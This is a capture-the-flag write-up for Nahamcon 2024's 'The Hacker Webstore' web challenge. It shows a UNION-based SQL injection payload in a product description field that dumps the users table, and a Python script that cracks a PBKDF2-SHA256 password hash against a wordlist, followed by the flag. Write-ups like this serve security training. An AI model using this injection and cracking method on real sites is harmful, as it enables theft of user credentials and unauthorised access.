---
layout: load_md
title: The White Circle | Nahamcon 2024 | The Hacker Webstore Writeup
desc: Check out our writeup for The Hacker Webstore for Nahamcon 2024 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2024
parent: nahamcon_2024
category: web
challenge: The Hacker Webstore
tags: "web, starry, sql, sqli, cracking"
date: 2024-05-28T00:00:00+00:00
last_modified_at: 2024-05-28T00:00:00+00:00
---


> Solved by: Starlord

Mirror : <a href="https://synthweb.ch/blog/nahamcon-ctf-2024/the-hacker-webstore">https://synthweb.ch/blog/nahamcon-ctf-2024/the-hacker-webstore</a>

![challenge description](https://i.imgur.com/TNLkY9J.png)


As we visit the challenge page, we can see an online store, which sells products aimed at hacker stereotypes.
There are 2 endpoints:

- / for products
- /create to create products
- /admin to login to the website’s back-end

Since we can create products I tried breaking one of 3 inputs by adding `'``)` to one of them, which returned this very helpful error, which helped understand what was going on.

![products page with sql error](https://i.imgur.com/Iy17z9A.png)


the following payload inserted in the description field did the trick for me:

```
lord') UNION SELECT * FROM users/*
```

This will show everything from the table `users` and comment out the rest of the line.


![uncrackable hashes](https://i.imgur.com/FTE7qtQ.png)


From there it was just a matter of cracking the hashes. But it turned out to be more complicated than usual:
As per research, we found out that hashcat and john the ripper, 2 most commonly used tools for cracking hashes, had multiple ways of cracking pbkdf2 sha256 hashes, but none of them had a working function for our specific current hash format.
We managed to identify the different parts of the hash thanks to reddit and stack overflow posts which looks like this:

    pbkdf2:sha256:<iterations amount>$<Salt>$<hash>

After trying desperately with modes 10900, 10000, 1460, the hashes were not cracking.

Remember, we have 2000 potential passwords in a list given in the challenge description, so even if we have 600k iterations, it shouldn’t take too long.

I ended up making my own decryption tool:

- crack.py

```python
import hashlib

def crack_pbkdf2_sha256_hash(password_list_file, target_hash, salt, iterations):
    with open(password_list_file, 'r') as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        # make PBKDF2-HMAC-SHA256
        dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), iterations)
        print(f"Trying password: {password}")
        
        # match check
        if dk.hex() == target_hash:
            print(f"Password found: {password}")
            return password
    
    print("Password not found in the provided list.")
    return None

target_hash = "b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57"
salt = "MSok34zBufo9d1tc"
iterations = 600000
password_list_file = "password_list.txt"

crack_pbkdf2_sha256_hash(password_list_file, target_hash, salt, iterations)
```

I made sure it would print each password to be able to visually confirm progress, as shown below:

![password found](https://i.imgur.com/FCaLxvU.png)


With this, I could then authenticate at /admin and see the flag:

![flag discovered](https://i.imgur.com/of6ycSh.png)

```
flag{87257f24fd71ea9ed8aa62837e768ec0}
```

